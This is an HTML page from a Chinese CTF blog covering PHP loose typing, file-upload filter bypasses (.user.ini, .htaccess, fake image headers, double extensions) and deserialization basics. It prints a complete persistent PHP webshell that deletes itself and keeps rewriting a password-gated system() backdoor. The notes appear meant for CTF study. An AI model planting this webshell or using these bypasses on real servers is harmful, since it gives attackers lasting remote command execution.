@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html>
+  <head>
+     
+    <meta charset="UTF-8">
+    <title>PHP - d0ud</title>
+    <link rel="shortcut icon" href="/static/img/icon.png">
+    <link rel="icon" href="/static/img/icon.png" sizes="192x192"/>
+    
+<link rel="stylesheet" href="/static/kico.css">
+<link rel="stylesheet" href="/static/hingle.css">
+
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/FortAwesome/Font-Awesome/css/font-awesome.min.css">
+
+    <meta name="viewport" content="width=device-width, maximum-scale=1, initial-scale=1"/>
+    <meta property="og:site_name" content="d0ud">
+    <meta property="og:title" content="PHP"/>
+    
+    <style>body:before{ content: ''; background-image: url(https://github.com/null-d0ud/d0ud/blob/main/bgg.png) }</style>
+    
+<meta name="generator" content="Hexo 5.4.1"><link rel="alternate" href="/atom.xml" title="d0ud" type="application/atom+xml">
+</head>
+
+  <body>
+    <header>
+    <div class="head-title">
+        <h4>d0ud</h4>
+    </div>
+    <div class="head-action">
+        <div class="toggle-btn"></div>
+        <div class="light-btn"></div>
+        <div class="search-btn"></div>
+    </div>
+    <!--<form class="head-search" method="post">
+        <input type="text" name="s" placeholder="搜索什么？">
+    </form>-->
+    <nav class="head-menu">
+        <a href="/">首页</a>
+        <div class="has-child">
+            <a>分类</a>
+            <div class="sub-menu">
+                <a class="category-link" href="/categories/PHP/">PHP</a><a class="category-link" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a><a class="category-link" href="/categories/authentication/">authentication</a><a class="category-link" href="/categories/file-upload/">file upload</a><a class="category-link" href="/categories/wp/">wp</a>
+            </div>
+        </div>
+        
+            <a href="/friends">ctfers</a>
+        
+    </nav>
+</header>
+
+    <main>
+    <div class="wrap min">
+        <section class="post-title">
+            <h2>PHP</h2>
+            <div class="post-meta">
+                <time class="date">2023.09.15</time>
+            
+                <span class="category"><a class="category-link" href="/categories/PHP/">PHP</a></span>
+            
+            </div>
+        </section>
+        <article class="post-content">
+        
+            <h1 id="弱语言类型"><a href="#弱语言类型" class="headerlink" title="弱语言类型"></a>弱语言类型</h1><p>PHP是一门弱类型语言，当涉及“==”判断时，它的表现是有一些奇特的。<br>例如，“a==0”将会得到true，“a==1”将会得到false。</p>
+<p>原理：PHP语言中在涉及“==”判断时，如果运算符两边分别为字符串（不以数字开头的字符串），会将字符串转化为数字0，再进行比较。如果是以数字开头的字符串，那么它将会转化成开头的数字（即第一个字母前的所有数字）。</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token string double-quoted-string">"787abe"</span><span class="token operator">=</span><span class="token number">787</span>   
+<span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token string double-quoted-string">"abc"</span><span class="token operator">=</span><span class="token number">0</span>    
+<span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token string double-quoted-string">"1a2b"</span><span class="token operator">=</span><span class="token number">1</span>    
+<span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token string double-quoted-string">"a12b"</span><span class="token operator">=</span><span class="token number">0</span>    
+<span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token string double-quoted-string">"000123abc"</span><span class="token operator">=</span><span class="token number">123</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>例外：(int)”1e2”==100，在PHP中若像这种格式的字符串转化成数字，PHP会将其视为科学计数法。<br>(int)”1e2abc”=(int)”1e2”=100<br>(int )”1eabce”=1</p>
+<h1 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h1><p>不死马，即难以清除的木马。<br>一般原理为：在可以上传文件的情况下，上传一个可执行文件，这个文件的作用是在服务端创建一个进程，然后删除自身，创建的进程会不停的在服务端生成木马文件。<br>网上最常见的脚本为</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
+<span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'.shell.php'</span><span class="token punctuation">;</span>
+<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php if(md5($_GET["pass"])=="2591c98b70119fe624898b1e424b5e91")&#123;@system($_POST[cmd]);&#125; ?>'</span><span class="token punctuation">;</span>
+<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="前端限制文件后缀"><a href="#前端限制文件后缀" class="headerlink" title="前端限制文件后缀"></a>前端限制文件后缀</h2><p>通过抓包修改即可</p>
+<h2 id="后端限制文件后缀"><a href="#后端限制文件后缀" class="headerlink" title="后端限制文件后缀"></a>后端限制文件后缀</h2><p>想要绕过后端限制，最重要的是知道过滤规则</p>
+<p>比如文件头检查我们就可以加上图片文件头，如<code>GIF8a</code></p>
+<p>文件内容检查就可以用<code>&lt;script language=&#39;php&#39;&gt;</code>来代替 <code>&lt;?php</code></p>
+<p>或者利用解析漏洞，加上无法解析的后缀，如上传<code>shell.php.abc</code>等等</p>
+<h3 id="通过上传-user-ini文件或-htaccess文件来绕过"><a href="#通过上传-user-ini文件或-htaccess文件来绕过" class="headerlink" title="通过上传.user.ini文件或.htaccess文件来绕过"></a>通过上传.user.ini文件或.htaccess文件来绕过</h3><blockquote>
+<p>PHP 支持基于每个目录的 INI 文件配置。此类文件 仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果你的 PHP 以模块化运行在 Apache 里，则用 .htaccess 文件有同样效果。</p>
+<p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>
+<p>在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p>
+<p>两个新的 INI 指令， user_ini.filename 和 user_ini.cache_ttl 控制着用户 INI 文件的使用。</p>
+<p>user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 .user.ini。</p>
+<p>user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</p>
+</blockquote>
+<p>.user.ini</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">auto_prepend_file=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>file_path</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>.htaccess</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">AddType application/x-httpd-php .jpg <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FileMatch</span> <span class="token attr-name">"&lt;file_name</span><span class="token punctuation">></span></span>">
+SetHandler application/x-httpd-php
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FileMatch</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<p>也可以利用解析漏洞，加上无法解析的后缀，如上传shell.php.abc</p>
+<hr>
+<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>序列化<code>serialize()</code>和反序列化<code>unserialize()</code></p>
+<p>序列化是为了数据更方便的传输，如cookie和session缓存</p>
+<p>反序列化则是将容易传输的数据转变成便于使用的数据</p>
+<p>看以下一段代码</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hello"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"d0ud"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>运行结果</p>
+<pre class="line-numbers language-none"><code class="language-none">a:2:&#123;i:0;s:5:&quot;hello&quot;;i:1;s:4:&quot;d0ud&quot;;&#125;
+Array
+(
+    [0] &#x3D;&gt; hello
+    [1] &#x3D;&gt; d0ud
+)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre><code>逐个解析，a,array   2,2个属性   i，int  0，下标0    
+s，string   5，长度为5
+</code></pre>
+<p>对象的序列化</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">people</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"hello"</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"d0ud"</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">c</span> <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> 
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">people</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token constant">PHP_EOL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>输出</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">people <span class="token keyword type-declaration">Object</span>
+<span class="token punctuation">(</span>
+    <span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">=></span> hello
+    <span class="token punctuation">[</span>b<span class="token punctuation">:</span>people<span class="token punctuation">:</span><span class="token keyword">private</span><span class="token punctuation">]</span> <span class="token operator">=></span> d0ud
+    <span class="token punctuation">[</span>c<span class="token punctuation">:</span><span class="token keyword">protected</span><span class="token punctuation">]</span> <span class="token operator">=></span> <span class="token number">7</span>
+<span class="token punctuation">)</span>
+
+<span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"people"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"hello"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"peopleb"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"d0ud"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"*c"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
+
+<span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>people<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>a<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>hello<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A9<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>people<span class="token operator">%</span><span class="token number">00</span>b<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>d0ud<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>c<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bi<span class="token operator">%</span><span class="token number">3</span>A7<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>通过url编码后的输出可以发现，有些字符是不可见的</p>
+<p>对于对象的序列化，如果变量是protected属性，则会在变量名前加上\x00*\x00</p>
+<p>private属性则会在变量名前加上\x00类名\x00</p>
+<p>同时对象的方法是不能被序列化的</p>
+<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><pre><code>__wakeup() //执行unserialize()时，先会调用这个函数
+__sleep() //执行serialize()时，先会调用这个函数
+__destruct() //对象被销毁时触发
+__call() //在对象上下文中调用不可访问的方法时触发
+__callStatic() //在静态上下文中调用不可访问的方法时触发
+__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法
+__set() //用于将数据写入不可访问的属性
+__isset() //在不可访问的属性上调用isset()或empty()触发
+__unset() //在不可访问的属性上使用unset()时触发
+__toString() //把类当作字符串使用时触发
+__invoke() //当尝试将对象调用为函数时触发
+</code></pre>
+<h1 id="尚在更新中"><a href="#尚在更新中" class="headerlink" title="尚在更新中"></a>尚在更新中</h1>
+        </article>
+        <section class="post-near">
+            <ul>
+                
+                    <li>上一篇: <a href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></li>
+                
+                
+                    <li>下一篇: <a href="/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li>
+                
+            </ul>
+        </section>
+        
+    
+        <section class="post-author">
+        
+            <figure class="author-avatar">
+                <img src="https://github.com/null-d0ud/d0ud/blob/main/logo.jpg" alt="d0ud" />
+            </figure>
+        
+            <div class="author-info">
+                <h4>d0ud</h4>
+                <p>a ctfer</p>
+            </div>
+        </section>
+    
+    </div>
+</main>
+
+    <footer>
+    <div class="buttons">
+        <a class="to-top" href="#"></a>
+    </div>
+    <div class="wrap min">
+        <section class="widget">
+            <div class="row">
+                <div class="col-m-4">
+                    <h3 class="title-recent">最新文章：</h3>
+                    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a></li><li class="post-list-item"><a class="post-list-link" href="/%E5%B7%A5%E5%85%B7/">工具</a></li><li class="post-list-item"><a class="post-list-link" href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></li><li class="post-list-item"><a class="post-list-link" href="/PHP/">PHP</a></li><li class="post-list-item"><a class="post-list-link" href="/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="post-list-item"><a class="post-list-link" href="/%E9%A2%98%E8%A7%A3/">一些CTF题解</a></li></ul>
+                </div>
+                <div class="col-m-4">
+                    <h3 class="title-date">历史：</h3>
+                    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li></ul>
+                </div>
+                <div class="col-m-4">
+                    <h3 class="title-tags">标签：</h3>
+                    <a href="/tags/script/" style="font-size: 10px;">script</a>
+                </div>
+            </div>
+        </section>
+        <section class="sub-footer">
+            <p>© 2023 <a href="/">d0ud</a>. All Rights Reserved. Theme By <a href="https://github.com/Dreamer-Paul/Hingle" target="_blank" rel="nofollow">Hingle</a>.</p>
+        </section>
+    </div>
+</footer>
+
+
+<script src="/static/kico.js"></script>
+<script src="/static/hingle.js"></script>
+
+
+<script>var hingle = new Paul_Hingle({"copyright":false,"night":false});</script>
+
+  </body>
+</html>
